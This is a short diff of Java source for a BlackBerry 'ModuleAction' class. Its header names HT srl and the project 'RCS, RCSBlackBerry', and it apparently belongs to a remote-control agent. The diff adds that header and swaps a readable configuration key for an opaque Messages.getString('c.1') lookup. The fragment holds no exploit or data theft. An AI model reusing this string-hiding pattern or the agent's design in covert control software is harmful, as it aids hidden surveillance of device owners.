@@ -1,6 +1,15 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2012
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+
 package blackberry.action;
 
+import blackberry.Messages;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
@@ -8,7 +17,7 @@ import blackberry.debug.DebugLevel;
 
 abstract class ModuleAction extends SubAction {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ModAction", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ModAction", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
     protected String moduleId;
 
@@ -25,11 +34,11 @@ abstract class ModuleAction extends SubAction {
     protected boolean parse(ConfAction params) {
 
         try {
-            this.moduleId = params.getString("module");
+            this.moduleId = params.getString(Messages.getString("c.1")); //$NON-NLS-1$
         } catch (ConfigurationException e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("parse");
+            debug.error("parse"); //$NON-NLS-1$
             //#endif
             return false;
         }
